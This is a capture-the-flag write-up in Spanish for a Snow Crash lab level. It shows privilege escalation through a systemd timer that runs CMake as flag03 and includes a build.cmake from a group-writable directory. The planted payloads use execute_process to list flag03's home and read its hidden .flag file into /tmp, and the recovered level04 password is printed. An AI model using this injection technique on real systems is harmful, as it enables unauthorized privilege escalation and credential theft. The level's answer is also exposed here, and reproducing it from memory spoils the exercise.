# Level03 - Snow Crash

## Tipo de ejercicio

Escalada de privilegios mediante una tarea `systemd` periódica que ejecuta
un archivo CMake controlado por un grupo con permisos de escritura.

## Objetivo

Encontrar la credencial que permite conectarse al usuario `level04`.

El ejercicio utiliza un runner de CMake ejecutado como `flag03`.

## 1. Inspeccionar el entorno

Desde la sesión SSH de `level03`:

```bash
whoami
hostname
pwd
ls -la
cat README
find /home/level03 -maxdepth 2 -ls
```

El README contiene la pista:

```text
Every Burbclave has rules. Find the loophole.
```

El directorio personal no contiene un ejecutable `level03`, por lo que se
buscan componentes instalados para este nivel:

```bash
find /opt/snowcrash/level03 -maxdepth 2 -ls 2>/dev/null
find / -xdev -user flag03 -ls 2>/dev/null
find / -xdev -type f -perm -4000 -ls 2>/dev/null
```

El resultado relevante es:

```text
/opt/snowcrash/level03/CMakeLists.txt
```

El archivo pertenece a `flag03` y es legible por el grupo `level03`:

```text
-rw-r----- 1 flag03 level03 ... /opt/snowcrash/level03/CMakeLists.txt
```

## 2. Analizar el CMakeLists.txt

```bash
cat /opt/snowcrash/level03/CMakeLists.txt
```

El script lee una configuración protegida y construye una ruta de trabajo:

```cmake
file(READ "/etc/burbclave/burbclave.conf" CONF_CONTENT)

string(REGEX MATCH "runtime_base=([^\\n]+)" _ ${CONF_CONTENT})
set(RUNTIME_BASE ${CMAKE_MATCH_1})

string(REGEX MATCH "workspace=([^\\n]+)" _ ${CONF_CONTENT})
set(WORKSPACE_NAME ${CMAKE_MATCH_1})

string(CONCAT RESOLVED_BUILD_PATH "${RUNTIME_BASE}" "/" "${WORKSPACE_NAME}")

include(${RESOLVED_BUILD_PATH}/build.cmake)
```

La configuración no se puede leer directamente:

```bash
ls -ld /etc/burbclave
ls -l /etc/burbclave/burbclave.conf
cat /etc/burbclave/burbclave.conf
```

Resultado relevante:

```text
drwx------ 2 flag03 flag03 ... /etc/burbclave
Permission denied
```

Aunque no podemos leer la configuración, el script revela que el runner
incluirá un archivo llamado `build.cmake` desde una ruta determinada por esa
configuración.

## 3. Encontrar el directorio escribible

Se buscan directorios relacionados con Burbclave:

```bash
find / -xdev -iname '*burbclave*' \\
	-printf '%M %u %g %p\\n' 2>/dev/null
```

Aparece el directorio de trabajo:

```text
drwxrwxr-x root burbclave /var/lib/burbclave
```

Se comprueban sus contenidos y permisos:

```bash
id
ls -la /var/lib/burbclave
ls -la /var/lib/burbclave/staging
```

Resultado relevante:

```text
uid=1004(level03) gid=1006(level03) groups=1006(level03),988(burbclave),1001(levelgroup)
drwxrwxr-x root burbclave /var/lib/burbclave/staging
```

El usuario `level03` pertenece al grupo `burbclave`, así que puede escribir en
`staging`:

```bash
touch /var/lib/burbclave/staging/test-level03
ls -l /var/lib/burbclave/staging/test-level03
rm /var/lib/burbclave/staging/test-level03
```

## 4. Confirmar la ejecución privilegiada

El servicio y su temporizador se pueden consultar con:

```bash
cat /etc/systemd/system/burbclave.service
cat /etc/systemd/system/burbclave.timer
systemctl status burbclave.service --no-pager
systemctl list-timers --all --no-pager | grep burb
```

La configuración relevante del servicio es:

```ini
[Service]
Type=oneshot
User=flag03
ExecStart=/usr/bin/cmake -P /opt/snowcrash/level03/CMakeLists.txt
```

El temporizador ejecuta el servicio aproximadamente una vez por minuto:

```ini
OnUnitActiveSec=60s
Unit=burbclave.service
```

Por tanto, si colocamos un `build.cmake` en el directorio de trabajo, el
servicio lo incluirá y lo ejecutará con los permisos de `flag03`.

## 5. Crear un payload de reconocimiento

El script independiente utilizado para esta fase está disponible en
[build-recon.cmake](build-recon.cmake). Para usarlo en la OVA, se puede copiar
su contenido en la ruta de staging:

Primero se creó un archivo CMake que listara el directorio de `flag03` y
guardara el resultado en `/tmp`. No se puede usar la salida normal porque el
servicio tiene `StandardOutput=null`.

```bash
cat > /var/lib/burbclave/staging/build.cmake <<'EOF'
execute_process(
	COMMAND /bin/ls -la /home/flag03
	OUTPUT_FILE /tmp/burbclave_flag03_listing.txt
	ERROR_FILE /tmp/burbclave_flag03_errors.txt
)
EOF
```

Tras la siguiente ejecución del temporizador:

```bash
systemctl status burbclave.service --no-pager
ls -l /tmp/burbclave_flag03_*
cat /tmp/burbclave_flag03_listing.txt
cat /tmp/burbclave_flag03_errors.txt
```

El servicio terminó correctamente y mostró un archivo oculto:

```text
-r-------- 1 flag03 flag03 29 ... .flag
```

La ruta del secreto era:

```text
/home/flag03/.flag
```

## 6. Extraer la credencial

El payload independiente de extracción está disponible en
[build-extract.cmake](build-extract.cmake). Sustituye el archivo anterior por
este contenido:

Se sustituyó el payload por otro que leyera `.flag` y escribiera su contenido
en un archivo temporal legible:

```bash
cat > /var/lib/burbclave/staging/build.cmake <<'EOF'
execute_process(
	COMMAND /bin/cat /home/flag03/.flag
	OUTPUT_FILE /tmp/level03_flag.txt
	ERROR_FILE /tmp/level03_flag_errors.txt
)
EOF
```

Después de la siguiente ejecución del timer:

```bash
cat /tmp/level03_flag.txt
cat /tmp/level03_flag_errors.txt
```

La credencial obtenida fue:

```text
b209ea91ad7a5c2a0b0f4e195ca4
```

## 7. Conectarse a level04

Desde el equipo anfitrión, cerrar la sesión actual y conectarse al siguiente
nivel:

```bash
exit
ssh level04@localhost -p 2424
```

Cuando SSH solicite la contraseña, introducir:

```text
b209ea91ad7a5c2a0b0f4e195ca4
```

La conexión correcta muestra un prompt similar a:

```text
level04@snowcrash:~$
```

## Conclusión

Un servicio periódico se ejecuta como `flag03` y carga un `build.cmake` desde un directorio
en el que `level03` puede escribir por pertenecer al grupo `burbclave`.

El payload CMake permitió ejecutar `/bin/cat` con los permisos de `flag03` y
leer `/home/flag03/.flag`. La credencial encontrada para `level04` es:

```text
b209ea91ad7a5c2a0b0f4e195ca4
```
